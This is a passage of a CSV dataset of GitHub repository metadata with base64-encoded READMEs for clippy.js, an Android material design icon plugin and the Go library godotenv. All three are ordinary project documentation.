name,id,description,language,open_issues,stargazers_count,topics,watchers,fork,forks_url,readme,config,travis0,travis1,travis2,travis3,travis4,travis5,travis6,travis7,travis8,travis9,travis10,travis11,travis12,travis13,travis14,travis15,travis16,travis17,travis18,travis19,travis20,travis21,travis22,travis23,gitlab0,gitlab1,gitlab2,gitlab3,gitlab4,gitlab5,gitlab6,gitlab7,gitlab8,gitlab9,gitlab10,gitlab11,gitlab12,gitlab13,gitlab14,gitlab15,gitlab16,gitlab17,gitlab18,gitlab19,gitlab20,gitlab21,gitlab22,gitlab23,jenkinsPipeline0,jenkinsPipeline1,jenkinsPipeline2,jenkinsPipeline3,jenkinsPipeline4,jenkinsPipeline5,jenkinsPipeline6,jenkinsPipeline7,jenkinsPipeline8,jenkinsPipeline9,jenkinsPipeline10,jenkinsPipeline11,jenkinsPipeline12,jenkinsPipeline13,jenkinsPipeline14,jenkinsPipeline15,jenkinsPipeline16,jenkinsPipeline17,jenkinsPipeline18,jenkinsPipeline19,jenkinsPipeline20,jenkinsPipeline21,jenkinsPipeline22,jenkinsPipeline23,cirrus0,cirrus1,cirrus2,cirrus3,cirrus4,cirrus5,cirrus6,cirrus7,cirrus8,cirrus9,cirrus10,cirrus11,cirrus12,cirrus13,cirrus14,cirrus15,cirrus16,cirrus17,cirrus18,cirrus19,cirrus20,cirrus21,cirrus22,cirrus23,github0,github1,github2,github3,github4,github5,github6,github7,github8,github9,github10,github11,github12,github13,github14,github15,github16,github17,github18,github19,github20,github21,github22,github23,cds0,cds1,cds2,cds3,cds4,cds5,cds6,cds7,cds8,cds9,cds10,cds11,cds12,cds13,cds14,cds15,cds16,cds17,cds18,cds19,cds20,cds21,cds22,cds23,azure0,azure1,azure2,azure3,azure4,azure5,azure6,azure7,azure8,azure9,azure10,azure11,azure12,azure13,azure14,azure15,azure16,azure17,azure18,azure19,azure20,azure21,azure22,azure23,circleci0,circleci1,circleci2,circleci3,circleci4,circleci5,circleci6,circleci7,circleci8,circleci9,circleci10,circleci11,circleci12,circleci13,circleci14,circleci15,circleci16,circleci17,circleci18,circleci19,circleci20,circleci21,circleci22,circleci23,bitbucket0,bitbucket1,bitbucket2,bitbucket3,bitbucket4,bitbucket5,bitbucket6,bitbucket7,bitbucket8,bitbucket9,bitbucket10,bitbucket11,bitbucket12,bitbucket13,bitbucket14,bitbucket15,bitbucket16,bitbucket17,bitbucket18,bitbucket19,bitbucket20,bitbucket21,bitbucket22,bitbucket23
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'clippy.js',4434405,b'Add Clippy or his friends to any website for instant nostalgia.',b'JavaScript',40,2387,,2387,False,b'https://api.github.com/repos/smore-inc/clippy.js/forks',"W0NsaXBweS5KU10oaHR0cDovL3Ntb3JlLmNvbS9jbGlwcHktanMpCj09PT09
PT09PQpBZGQgQ2xpcHB5IG9yIGhpcyBmcmllbmRzIHRvIGFueSB3ZWJzaXRl
IGZvciBpbnN0YW50IG5vc3RhbGdpYS4gIApSZWFkIG1vcmUgYWJvdXQgdGhl
IHByb2plY3Qgb24gW291ciBob21lcGFnZV0oaHR0cDovL3Ntb3JlLmNvbS9j
bGlwcHktanMpLgoKClVzYWdlOiBTZXR1cAotLS0tLS0tLS0tLS0KQWRkIHRo
aXMgY29kZSB0byB5b3UgdG8geW91ciBwYWdlIHRvIGVuYWJsZSBDbGlwcHku
anMuCgpgYGBodG1sCjwhLS0gQWRkIHRoZSBzdHlsZXNoZWV0IHRvIHRoZSBo
ZWFkIC0tPgo8bGluayByZWw9InN0eWxlc2hlZXQiIHR5cGU9InRleHQvY3Nz
IiBocmVmPSJjbGlwcHkuY3NzIiBtZWRpYT0iYWxsIj4KCi4uLgoKPCEtLSBB
ZGQgdGhlc2Ugc2NyaXB0cyB0byAgdGhlIGJvdHRvbSBvZiB0aGUgcGFnZSAt
LT4KPCEtLSBqUXVlcnkgMS43KyAtLT4KPHNjcmlwdCBzcmM9ImpxdWVyeS4x
LjcubWluLmpzIj48L3NjcmlwdD4KCjwhLS0gQ2xpcHB5LmpzIC0tPgo8c2Ny
aXB0IHNyYz0iY2xpcHB5Lm1pbi5qcyI+PC9zY3JpcHQ+Cgo8IS0tIEluaXQg
c2NyaXB0IC0tPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+CiAg
ICBjbGlwcHkubG9hZCgnTWVybGluJywgZnVuY3Rpb24oYWdlbnQpewogICAg
ICAgIC8vIGRvIGFueXRoaW5nIHdpdGggdGhlIGxvYWRlZCBhZ2VudAogICAg
ICAgIGFnZW50LnNob3coKTsKICAgIH0pOwo8L3NjcmlwdD4KCmBgYAoKVXNh
Z2U6IEFjdGlvbnMKLS0tLS0tLS0tLS0tLS0KQWxsIHRoZSBhZ2VudCBhY3Rp
b25zIGFyZSBxdWV1ZWQgYW5kIGV4ZWN1dGVkIGJ5IG9yZGVyLCBzbyB5b3Ug
Y291bGQgc3RhY2sgdGhlbS4KCmBgYGphdmFzY3JpcHQKLy8gcGxheSBhIGdp
dmVuIGFuaW1hdGlvbgphZ2VudC5wbGF5KCdTZWFyY2hpbmcnKTsKCi8vIHBs
YXkgYSByYW5kb20gYW5pbWF0aW9uCmFnZW50LmFuaW1hdGUoKTsKCi8vIGdl
dCBhIGxpc3Qgb2YgYWxsIHRoZSBhbmltYXRpb25zCmFnZW50LmFuaW1hdGlv
bnMoKTsKLy8gPT4gWyJNb3ZlTGVmdCIsICJDb25ncmF0dWxhdGUiLCAiSGlk
ZSIsICJQbGVhc2VkIiwgIkFja25vd2xlZGdlIiwgLi4uXQoKLy8gU2hvdyB0
ZXh0IGJhbGxvb24KYWdlbnQuc3BlYWsoJ1doZW4gYWxsIGVsc2UgZmFpbHMs
IGJpbmQgc29tZSBwYXBlciB0b2dldGhlci4gTXkgbmFtZSBpcyBDbGlwcHku
Jyk7CgovLyBtb3ZlIHRvIHRoZSBnaXZlbiBwb2ludCwgdXNlIGFuaW1hdGlv
biBpZiBhdmFpbGFibGUKYWdlbnQubW92ZVRvKDEwMCwxMDApOwoKLy8gZ2Vz
dHVyZSBhdCBhIGdpdmVuIHBvaW50IChpZiBnZXN0dXJlIGFuaW1hdGlvbiBp
cyBhdmFpbGFibGUpCmFnZW50Lmdlc3R1cmVBdCgyMDAsMjAwKTsKCi8vIHN0
b3AgdGhlIGN1cnJlbnQgYWN0aW9uIGluIHRoZSBxdWV1ZQphZ2VudC5zdG9w
Q3VycmVudCgpOwoKLy8gc3RvcCBhbGwgYWN0aW9ucyBpbiB0aGUgcXVldWUg
YW5kIGdvIGJhY2sgdG8gaWRsZSBtb2RlCmFnZW50LnN0b3AoKTsKYGBgCgpT
cGVjaWFsIFRoYW5rcwotLS0tLS0tLS0tLS0tLQoqIFRoZSBhd2Vzb21lIFtD
aW5uYW1vbiBTb2Z0d2FyZV0oaHR0cDovL3d3dy5jaW5uYW1vbnNvZnR3YXJl
LmNvbS8pIGZvciBkZXZlbG9waW5nIFtEb3VibGUgQWdlbnRdKGh0dHA6Ly9k
b3VibGVhZ2VudC5zb3VyY2Vmb3JnZS5uZXQvKQp0aGUgcHJvZ3JhbSB3ZSB1
c2VkIHRvIHVucGFjayBDbGlwcHkgYW5kIGhpcyBmcmllbmRzIQoqIE1pY3Jv
c29mdCwgZm9yIGNyZWF0aW5nIGNsaXBweSA6KQo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'android-material-design-icon-generator-plugin',28638448,b'This plugin help you to set material design icon to your project.',b'Java',13,2387,,2387,False,b'https://api.github.com/repos/konifar/android-material-design-icon-generator-plugin/forks',"QW5kcm9pZCBNYXRlcmlhbCBEZXNpZ24gSWNvbiBHZW5lcmF0b3IgUGx1Z2lu
Cj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09
PQoKVGhpcyBwbHVnaW4gaGVscCB5b3UgdG8gc2V0IFttYXRlcmlhbCBkZXNp
Z24gaWNvbnNdKGh0dHBzOi8vZ2l0aHViLmNvbS9nb29nbGUvbWF0ZXJpYWwt
ZGVzaWduLWljb25zKSB0byB5b3VyIEFuZHJvaWQgcHJvamVjdC4KCiFbY2Fw
dHVyZV0oaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2tvbmlm
YXIvYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1nZW5lcmF0b3ItcGx1
Z2luL21hc3Rlci9kb2NzL2NhcHR1cmUuZ2lmKQoKIyBJbnN0YWxsYXRpb24K
CiMjIE1hbnVhbGx5CgoxLiBEb3dubG9hZCB0aGUgW01hdGVyaWFsRGVzaWdu
SWNvbkdlbmVyYXRvclBsdWdpbi56aXBdKGh0dHBzOi8vZ2l0aHViLmNvbS9r
b25pZmFyL2FuZHJvaWQtbWF0ZXJpYWwtZGVzaWduLWljb24tZ2VuZXJhdG9y
LXBsdWdpbi9yYXcvbWFzdGVyL01hdGVyaWFsRGVzaWduSWNvbkdlbmVyYXRv
clBsdWdpbi56aXApCgpPbiBNQUM6CgoyLiBgUHJlZmVyZW5jZSA+IFBsdWdp
bnMgPiBJbnN0YWxsIHBsdWdpbiBmcm9tIGRpc2suLi5gIFNlbGVjdCBNYXRl
cmlhbERlc2lnbkljb25HZW5lcmF0b3JQbHVnaW4uemlwIGFib3ZlLgogCk9u
IExpbnV4IG9yIFdpbmRvd3M6CgoyLiBgRmlsZSA+IFNldHRpbmdzLi4uID4g
SURFIFNldHRpbmdzID4gUGx1Z2lucyA+IEluc3RhbGwgcGx1Z2luIGZyb20g
ZGlzay4uLmAgU2VsZWN0IE1hdGVyaWFsRGVzaWduSWNvbkdlbmVyYXRvclBs
dWdpbi56aXAgYWJvdmUuCgozLiBSZXN0YXJ0IEludGVsbGlKL0FuZHJvaWQg
U3R1ZGlvIHRvIGFjdGl2YXRlIHBsdWdpbi4KCiMjIEluc3RhbGwgSW50ZWxs
aUogUGx1Z2luIFJlcG9zaXRvcmllcwoKT24gTUFDOgoKR28gYFByZWZlcmVu
Y2UgPiBQbHVnaW5zID4gQnJvd3NlIHJlcG9zaXRvcmllc2AsIHRoZW4gc2Vh
cmNoIGBtYXRlcmlhbGAuCgpPbiBMaW51eCBvciBXaW5kb3dzOgoKR28gYEZp
bGUgPiBTZXR0aW5ncy4uLiA+IElERSBTZXR0aW5ncyA+IFBsdWdpbnMgPiBC
cm93c2UgcmVwb3NpdG9yaWVzYCwgdGhlbiBzZWFyY2ggYG1hdGVyaWFsYC4K
CiFbY2FwdHVyZV0oaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29t
L2tvbmlmYXIvYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1nZW5lcmF0
b3ItcGx1Z2luL21hc3Rlci9kb2NzL2luc3RhbGwucG5nKQoKCiMgRGV2ZWxv
cG1lbnQKCmBgYAokIGdpdCBjbG9uZSBodHRwczovL2dpdGh1Yi5jb20va29u
aWZhci9hbmRyb2lkLW1hdGVyaWFsLWRlc2lnbi1pY29uLWdlbmVyYXRvci1w
bHVnaW4uZ2l0CiQgY2QgYW5kcm9pZC1tYXRlcmlhbC1kZXNpZ24taWNvbi1n
ZW5lcmF0b3ItcGx1Z2luCiQgZ2l0IHN1Ym1vZHVsZSBpbml0CiQgZ2l0IHN1
Ym1vZHVsZSBmb3JlYWNoIGdpdCBwdWxsIG9yaWdpbiBtYXN0ZXIKJCBweXRo
b24gc2NyaXB0L2NvcHlfaWNvbnMucHkKJCBweXRob24gc2NyaXB0L2NyZWF0
ZV90ZW1wbGF0ZS5weQpgYGAKCgoKIyBMaWNlbnNlCgpgYGAKQ29weXJpZ2h0
IDIwMTQtMjAxNSBZdXN1a2UgS29uaXNoaQoKTGljZW5zZWQgdW5kZXIgdGhl
IEFwYWNoZSBMaWNlbnNlLCBWZXJzaW9uIDIuMCAodGhlICJMaWNlbnNlIik7
CnlvdSBtYXkgbm90IHVzZSB0aGlzIGZpbGUgZXhjZXB0IGluIGNvbXBsaWFu
Y2Ugd2l0aCB0aGUgTGljZW5zZS4KWW91IG1heSBvYnRhaW4gYSBjb3B5IG9m
IHRoZSBMaWNlbnNlIGF0CgogICBodHRwOi8vd3d3LmFwYWNoZS5vcmcvbGlj
ZW5zZXMvTElDRU5TRS0yLjAKClVubGVzcyByZXF1aXJlZCBieSBhcHBsaWNh
YmxlIGxhdyBvciBhZ3JlZWQgdG8gaW4gd3JpdGluZywgc29mdHdhcmUKZGlz
dHJpYnV0ZWQgdW5kZXIgdGhlIExpY2Vuc2UgaXMgZGlzdHJpYnV0ZWQgb24g
YW4gIkFTIElTIiBCQVNJUywKV0lUSE9VVCBXQVJSQU5USUVTIE9SIENPTkRJ
VElPTlMgT0YgQU5ZIEtJTkQsIGVpdGhlciBleHByZXNzIG9yIGltcGxpZWQu
ClNlZSB0aGUgTGljZW5zZSBmb3IgdGhlIHNwZWNpZmljIGxhbmd1YWdlIGdv
dmVybmluZyBwZXJtaXNzaW9ucyBhbmQKbGltaXRhdGlvbnMgdW5kZXIgdGhl
IExpY2Vuc2UuCmBgYAo=
",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
b'godotenv',11759482,"b""A Go port of Ruby's dotenv library (Loads environment variables from `.env`.)""",b'Go',22,2386,,2386,False,b'https://api.github.com/repos/joho/godotenv/forks',"IyBHb0RvdEVudiBbIVtCdWlsZCBTdGF0dXNdKGh0dHBzOi8vdHJhdmlzLWNp
Lm9yZy9qb2hvL2dvZG90ZW52LnN2Zz9icmFuY2g9bWFzdGVyKV0oaHR0cHM6
Ly90cmF2aXMtY2kub3JnL2pvaG8vZ29kb3RlbnYpIFshW0J1aWxkIHN0YXR1
c10oaHR0cHM6Ly9jaS5hcHB2ZXlvci5jb20vYXBpL3Byb2plY3RzL3N0YXR1
cy85djQwdm5mdnZnZGU2NHU0P3N2Zz10cnVlKV0oaHR0cHM6Ly9jaS5hcHB2
ZXlvci5jb20vcHJvamVjdC9qb2hvL2dvZG90ZW52KSBbIVtHbyBSZXBvcnQg
Q2FyZF0oaHR0cHM6Ly9nb3JlcG9ydGNhcmQuY29tL2JhZGdlL2dpdGh1Yi5j
b20vam9oby9nb2RvdGVudildKGh0dHBzOi8vZ29yZXBvcnRjYXJkLmNvbS9y
ZXBvcnQvZ2l0aHViLmNvbS9qb2hvL2dvZG90ZW52KQoKQSBHbyAoZ29sYW5n
KSBwb3J0IG9mIHRoZSBSdWJ5IGRvdGVudiBwcm9qZWN0ICh3aGljaCBsb2Fk
cyBlbnYgdmFycyBmcm9tIGEgLmVudiBmaWxlKQoKRnJvbSB0aGUgb3JpZ2lu
YWwgTGlicmFyeToKCj4gU3RvcmluZyBjb25maWd1cmF0aW9uIGluIHRoZSBl
bnZpcm9ubWVudCBpcyBvbmUgb2YgdGhlIHRlbmV0cyBvZiBhIHR3ZWx2ZS1m
YWN0b3IgYXBwLiBBbnl0aGluZyB0aGF0IGlzIGxpa2VseSB0byBjaGFuZ2Ug
YmV0d2VlbiBkZXBsb3ltZW50IGVudmlyb25tZW50c+KAk3N1Y2ggYXMgcmVz
b3VyY2UgaGFuZGxlcyBmb3IgZGF0YWJhc2VzIG9yIGNyZWRlbnRpYWxzIGZv
ciBleHRlcm5hbCBzZXJ2aWNlc+KAk3Nob3VsZCBiZSBleHRyYWN0ZWQgZnJv
bSB0aGUgY29kZSBpbnRvIGVudmlyb25tZW50IHZhcmlhYmxlcy4KPgo+IEJ1
dCBpdCBpcyBub3QgYWx3YXlzIHByYWN0aWNhbCB0byBzZXQgZW52aXJvbm1l
bnQgdmFyaWFibGVzIG9uIGRldmVsb3BtZW50IG1hY2hpbmVzIG9yIGNvbnRp
bnVvdXMgaW50ZWdyYXRpb24gc2VydmVycyB3aGVyZSBtdWx0aXBsZSBwcm9q
ZWN0cyBhcmUgcnVuLiBEb3RlbnYgbG9hZCB2YXJpYWJsZXMgZnJvbSBhIC5l
bnYgZmlsZSBpbnRvIEVOViB3aGVuIHRoZSBlbnZpcm9ubWVudCBpcyBib290
c3RyYXBwZWQuCgpJdCBjYW4gYmUgdXNlZCBhcyBhIGxpYnJhcnkgKGZvciBs
b2FkaW5nIGluIGVudiBmb3IgeW91ciBvd24gZGFlbW9ucyBldGMpIG9yIGFz
IGEgYmluIGNvbW1hbmQuCgpUaGVyZSBpcyB0ZXN0IGNvdmVyYWdlIGFuZCBD
SSBmb3IgYm90aCBsaW51eGlzaCBhbmQgd2luZG93cyBlbnZpcm9ubWVudHMs
IGJ1dCBJIG1ha2Ugbm8gZ3VhcmFudGVlcyBhYm91dCB0aGUgYmluIHZlcnNp
b24gd29ya2luZyBvbiB3aW5kb3dzLgoKIyMgSW5zdGFsbGF0aW9uCgpBcyBh
IGxpYnJhcnkKCmBgYHNoZWxsCmdvIGdldCBnaXRodWIuY29tL2pvaG8vZ29k
b3RlbnYKYGBgCgpvciBpZiB5b3Ugd2FudCB0byB1c2UgaXQgYXMgYSBiaW4g
Y29tbWFuZApgYGBzaGVsbApnbyBnZXQgZ2l0aHViLmNvbS9qb2hvL2dvZG90
ZW52L2NtZC9nb2RvdGVudgpgYGAKCiMjIFVzYWdlCgpBZGQgeW91ciBhcHBs
aWNhdGlvbiBjb25maWd1cmF0aW9uIHRvIHlvdXIgYC5lbnZgIGZpbGUgaW4g
dGhlIHJvb3Qgb2YgeW91ciBwcm9qZWN0OgoKYGBgc2hlbGwKUzNfQlVDS0VU
PVlPVVJTM0JVQ0tFVApTRUNSRVRfS0VZPVlPVVJTRUNSRVRLRVlHT0VTSEVS
RQpgYGAKClRoZW4gaW4geW91ciBHbyBhcHAgeW91IGNhbiBkbyBzb21ldGhp
bmcgbGlrZQoKYGBgZ28KcGFja2FnZSBtYWluCgppbXBvcnQgKAogICAgImdp
dGh1Yi5jb20vam9oby9nb2RvdGVudiIKICAgICJsb2ciCiAgICAib3MiCikK
CmZ1bmMgbWFpbigpIHsKICBlcnIgOj0gZ29kb3RlbnYuTG9hZCgpCiAgaWYg
ZXJyICE9IG5pbCB7CiAgICBsb2cuRmF0YWwoIkVycm9yIGxvYWRpbmcgLmVu
diBmaWxlIikKICB9CgogIHMzQnVja2V0IDo9IG9zLkdldGVudigiUzNfQlVD
S0VUIikKICBzZWNyZXRLZXkgOj0gb3MuR2V0ZW52KCJTRUNSRVRfS0VZIikK
CiAgLy8gbm93IGRvIHNvbWV0aGluZyB3aXRoIHMzIG9yIHdoYXRldmVyCn0K
YGBgCgpJZiB5b3UncmUgZXZlbiBsYXppZXIgdGhhbiB0aGF0LCB5b3UgY2Fu
IGp1c3QgdGFrZSBhZHZhbnRhZ2Ugb2YgdGhlIGF1dG9sb2FkIHBhY2thZ2Ug
d2hpY2ggd2lsbCByZWFkIGluIGAuZW52YCBvbiBpbXBvcnQKCmBgYGdvCmlt
cG9ydCBfICJnaXRodWIuY29tL2pvaG8vZ29kb3RlbnYvYXV0b2xvYWQiCmBg
YAoKV2hpbGUgYC5lbnZgIGluIHRoZSBwcm9qZWN0IHJvb3QgaXMgdGhlIGRl
ZmF1bHQsIHlvdSBkb24ndCBoYXZlIHRvIGJlIGNvbnN0cmFpbmVkLCBib3Ro
IGV4YW1wbGVzIGJlbG93IGFyZSAxMDAlIGxlZ2l0CgpgYGBnbwpfID0gZ29k
b3RlbnYuTG9hZCgic29tZXJhbmRvbWZpbGUiKQpfID0gZ29kb3RlbnYuTG9h
ZCgiZmlsZW51bWJlcm9uZS5lbnYiLCAiZmlsZW51bWJlcnR3by5lbnYiKQpg
YGAKCklmIHlvdSB3YW50IHRvIGJlIHJlYWxseSBmYW5jeSB3aXRoIHlvdXIg
ZW52IGZpbGUgeW91IGNhbiBkbyBjb21tZW50cyBhbmQgZXhwb3J0cyAoYmVs
b3cgaXMgYSB2YWxpZCBlbnYgZmlsZSkKCmBgYHNoZWxsCiMgSSBhbSBhIGNv
bW1lbnQgYW5kIHRoYXQgaXMgT0sKU09NRV9WQVI9c29tZXZhbApGT089QkFS
ICMgY29tbWVudHMgYXQgbGluZSBlbmQgYXJlIE9LIHRvbwpleHBvcnQgQkFS
PUJBWgpgYGAKCk9yIGZpbmFsbHkgeW91IGNhbiBkbyBZQU1MKGlzaCkgc3R5
bGUKCmBgYHlhbWwKRk9POiBiYXIKQkFSOiBiYXoKYGBgCgphcyBhIGZpbmFs
IGFzaWRlLCBpZiB5b3UgZG9uJ3Qgd2FudCBnb2RvdGVudiBtdW5naW5nIHlv
dXIgZW52IHlvdSBjYW4ganVzdCBnZXQgYSBtYXAgYmFjayBpbnN0ZWFkCgpg
YGBnbwp2YXIgbXlFbnYgbWFwW3N0cmluZ11zdHJpbmcKbXlFbnYsIGVyciA6
PSBnb2RvdGVudi5SZWFkKCkKCnMzQnVja2V0IDo9IG15RW52WyJTM19CVUNL
RVQiXQpgYGAKCi4uLiBvciBmcm9tIGFuIGBpby5SZWFkZXJgIGluc3RlYWQg
b2YgYSBsb2NhbCBmaWxlCgpgYGBnbwpyZWFkZXIgOj0gZ2V0UmVtb3RlRmls
ZSgpCm15RW52LCBlcnIgOj0gZ29kb3RlbnYuUGFyc2UocmVhZGVyKQpgYGAK
Ci4uLiBvciBmcm9tIGEgYHN0cmluZ2AgaWYgeW91IHNvIGRlc2lyZQoKYGBg
Z28KY29udGVudCA6PSBnZXRSZW1vdGVGaWxlQ29udGVudCgpCm15RW52LCBl
cnIgOj0gZ29kb3RlbnYuVW5tYXJzaGFsKGNvbnRlbnQpCmBgYAoKIyMjIFBy
ZWNlbmRlbmNlICYgQ29udmVudGlvbnMKCkV4aXN0aW5nIGVudnMgdGFrZSBw
cmVjZW5kZW5jZSBvZiBlbnZzIHRoYXQgYXJlIGxvYWRlZCBsYXRlci4KClRo
ZSBbY29udmVudGlvbl0oaHR0cHM6Ly9naXRodWIuY29tL2JrZWVwZXJzL2Rv
dGVudiN3aGF0LW90aGVyLWVudi1maWxlcy1jYW4taS11c2UpCmZvciBtYW5h
Z2luZyBtdWx0aXBsZSBlbnZpcm9ubWVudHMgKGkuZS4gZGV2ZWxvcG1lbnQs
IHRlc3QsIHByb2R1Y3Rpb24pCmlzIHRvIGNyZWF0ZSBhbiBlbnYgbmFtZWQg
YHtZT1VSQVBQfV9FTlZgIGFuZCBsb2FkIGVudnMgaW4gdGhpcyBvcmRlcjoK
CmBgYGdvCmVudiA6PSBvcy5HZXRlbnYoIkZPT19FTlYiKQppZiAiIiA9PSBl
bnYgewogIGVudiA9ICJkZXZlbG9wbWVudCIKfQoKZ29kb3RlbnYuTG9hZCgi
LmVudi4iICsgZW52ICsgIi5sb2NhbCIpCmlmICJ0ZXN0IiAhPSBlbnYgewog
IGdvZG90ZW52LkxvYWQoIi5lbnYubG9jYWwiKQp9CmdvZG90ZW52LkxvYWQo
Ii5lbnYuIiArIGVudikKZ29kb3RlbnYuTG9hZCgpIC8vIFRoZSBPcmlnaW5h
bCAuZW52CmBgYAoKSWYgeW91IG5lZWQgdG8sIHlvdSBjYW4gYWxzbyB1c2Ug
YGdvZG90ZW52Lk92ZXJsb2FkKClgIHRvIGRlZnkgdGhpcyBjb252ZW50aW9u
CmFuZCBvdmVyd3JpdGUgZXhpc3RpbmcgZW52cyBpbnN0ZWFkIG9mIG9ubHkg
c3VwcGxhbnRpbmcgdGhlbS4gVXNlIHdpdGggY2F1dGlvbi4KCiMjIyBDb21t
YW5kIE1vZGUKCkFzc3VtaW5nIHlvdSd2ZSBpbnN0YWxsZWQgdGhlIGNvbW1h
bmQgYXMgYWJvdmUgYW5kIHlvdSd2ZSBnb3QgYCRHT1BBVEgvYmluYCBpbiB5
b3VyIGAkUEFUSGAKCmBgYApnb2RvdGVudiAtZiAvc29tZS9wYXRoL3RvLy5l
bnYgc29tZV9jb21tYW5kIHdpdGggc29tZSBhcmdzCmBgYAoKSWYgeW91IGRv
bid0IHNwZWNpZnkgYC1mYCBpdCB3aWxsIGZhbGwgYmFjayBvbiB0aGUgZGVm
YXVsdCBvZiBsb2FkaW5nIGAuZW52YCBpbiBgUFdEYAoKIyMjIFdyaXRpbmcg
RW52IEZpbGVzCgpHb2RvdGVudiBjYW4gYWxzbyB3cml0ZSBhIG1hcCByZXBy
ZXNlbnRpbmcgdGhlIGVudmlyb25tZW50IHRvIGEgY29ycmVjdGx5LWZvcm1h
dHRlZCBhbmQgZXNjYXBlZCBmaWxlCgpgYGBnbwplbnYsIGVyciA6PSBnb2Rv
dGVudi5Vbm1hcnNoYWwoIktFWT12YWx1ZSIpCmVyciA6PSBnb2RvdGVudi5X
cml0ZShlbnYsICIuLy5lbnYiKQpgYGAKCi4uLiBvciB0byBhIHN0cmluZwoK
YGBgZ28KZW52LCBlcnIgOj0gZ29kb3RlbnYuVW5tYXJzaGFsKCJLRVk9dmFs
dWUiKQpjb250ZW50LCBlcnIgOj0gZ29kb3RlbnYuTWFyc2hhbChlbnYpCmBg
YAoKIyMgQ29udHJpYnV0aW5nCgpDb250cmlidXRpb25zIGFyZSBtb3N0IHdl
bGNvbWUhIFRoZSBwYXJzZXIgaXRzZWxmIGlzIHByZXR0eSBzdHVwaWRseSBu
YWl2ZSBhbmQgSSB3b3VsZG4ndCBiZSBzdXJwcmlzZWQgaWYgaXQgYnJlYWtz
IHdpdGggZWRnZSBjYXNlcy4KCipjb2RlIGNoYW5nZXMgd2l0aG91dCB0ZXN0
cyB3aWxsIG5vdCBiZSBhY2NlcHRlZCoKCjEuIEZvcmsgaXQKMi4gQ3JlYXRl
IHlvdXIgZmVhdHVyZSBicmFuY2ggKGBnaXQgY2hlY2tvdXQgLWIgbXktbmV3
LWZlYXR1cmVgKQozLiBDb21taXQgeW91ciBjaGFuZ2VzIChgZ2l0IGNvbW1p
dCAtYW0gJ0FkZGVkIHNvbWUgZmVhdHVyZSdgKQo0LiBQdXNoIHRvIHRoZSBi
cmFuY2ggKGBnaXQgcHVzaCBvcmlnaW4gbXktbmV3LWZlYXR1cmVgKQo1LiBD
cmVhdGUgbmV3IFB1bGwgUmVxdWVzdAoKIyMgUmVsZWFzZXMKClJlbGVhc2Vz
IHNob3VsZCBmb2xsb3cgW1NlbXZlcl0oaHR0cDovL3NlbXZlci5vcmcvKSB0
aG91Z2ggdGhlIGZpcnN0IGNvdXBsZSBvZiByZWxlYXNlcyBhcmUgYHYxYCBh
bmQgYHYxLjFgLgoKVXNlIFthbm5vdGF0ZWQgdGFncyBmb3IgYWxsIHJlbGVh
c2VzXShodHRwczovL2dpdGh1Yi5jb20vam9oby9nb2RvdGVudi9pc3N1ZXMv
MzApLiBFeGFtcGxlIGBnaXQgdGFnIC1hIHYxLjIuMWAKCiMjIENJCgpMaW51
eDogWyFbQnVpbGQgU3RhdHVzXShodHRwczovL3RyYXZpcy1jaS5vcmcvam9o
by9nb2RvdGVudi5zdmc/YnJhbmNoPW1hc3RlcildKGh0dHBzOi8vdHJhdmlz
LWNpLm9yZy9qb2hvL2dvZG90ZW52KSBXaW5kb3dzOiBbIVtCdWlsZCBzdGF0
dXNdKGh0dHBzOi8vY2kuYXBwdmV5b3IuY29tL2FwaS9wcm9qZWN0cy9zdGF0
dXMvOXY0MHZuZnZ2Z2RlNjR1NCldKGh0dHBzOi8vY2kuYXBwdmV5b3IuY29t
L3Byb2plY3Qvam9oby9nb2RvdGVudikKCiMjIFdobz8KClRoZSBvcmlnaW5h
bCBsaWJyYXJ5IFtkb3RlbnZdKGh0dHBzOi8vZ2l0aHViLmNvbS9ia2VlcGVy
